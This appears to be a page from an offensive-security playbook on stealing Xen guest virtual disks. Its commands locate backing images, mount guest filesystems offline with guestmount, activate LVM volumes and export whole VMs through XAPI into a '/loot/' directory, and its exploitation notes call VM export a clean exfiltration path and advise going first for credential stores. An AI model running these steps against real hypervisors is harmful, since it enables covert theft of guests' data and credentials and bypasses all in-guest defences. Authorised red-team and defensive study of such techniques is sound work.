---
title: "Disk and snapshot theft: taking Xen guest virtual disks"
order: 4
description: "Xen guest disks are virtual block devices backed by files (raw, VHD) or block storage (LVM, local or shared SRs on XenServer/XCP-ng). With dom0, storage, or XAPI access, an attacker reads the backing image offline or exports the VDI, extracting any guest's data without entering it, and reads snapshots for point-in-time state."
keywords:
  - vdi
  - vhd
  - storage repository
  - xen disk
  - offline access
---

# Disk and snapshot theft

A Xen guest's disk is a virtual block device the backend maps from a backing store: on upstream Xen that is a file (raw or VHD) or a block device (an LVM volume); on XenServer/XCP-ng it is a Virtual Disk Image (VDI) in a Storage Repository (SR), which may be local or shared. Access to the backing store, through dom0, the storage, or XAPI, lets an attacker read the guest filesystem offline or export the VDI, taking the data with no login and no in-guest defenses, and snapshots give point-in-time copies.

## Locate and read

```bash
# upstream Xen: the backing file/device from the domain config
grep -E 'disk|phy|file|vdev' /etc/xen/<guest>.cfg
xenstore-ls /local/domain/<domid>/device/vbd 2>/dev/null
guestmount -a /path/to/guest.img -i --ro /mnt/guest     # raw/VHD file
# LVM-backed: activate and mount the volume
lvs; lvchange -ay <vg>/<guest-lv>; guestmount -a /dev/<vg>/<guest-lv> -i --ro /mnt

# XenServer/XCP-ng: export the VDI via XAPI (no dom0 file access needed)
xe -s <host> -u root -pw <pw> vm-export vm=<name> filename=/loot/<name>.xva
# or snapshot then export
xe -s <host> -u root -pw <pw> vm-snapshot vm=<name> new-name-label=s
```

## Exploitation notes

- The read method depends on the backing type: `guestmount`/`qemu-nbd` for file images, `lvchange -ay` then mount for LVM, and XAPI `vm-export`/VDI export for XenServer/XCP-ng SRs.
- `vm-export` produces a portable XVA archive of the whole VM, a clean exfiltration path that needs only XAPI access, not dom0 file access.
- Offline mounting bypasses all guest controls; prioritise credential stores as with any disk theft.
- Snapshots capture point-in-time state; chain from [Host access and shell](host-access-and-shell.md) or the [Management plane](management-plane.md) for the required access.

## Tools

- [libguestfs / guestmount](https://libguestfs.org/)

## References

- [XenServer/XCP-ng storage and VDI export](https://docs.xcp-ng.org/)
- [Xen disk configuration](https://xenbits.xen.org/docs/)
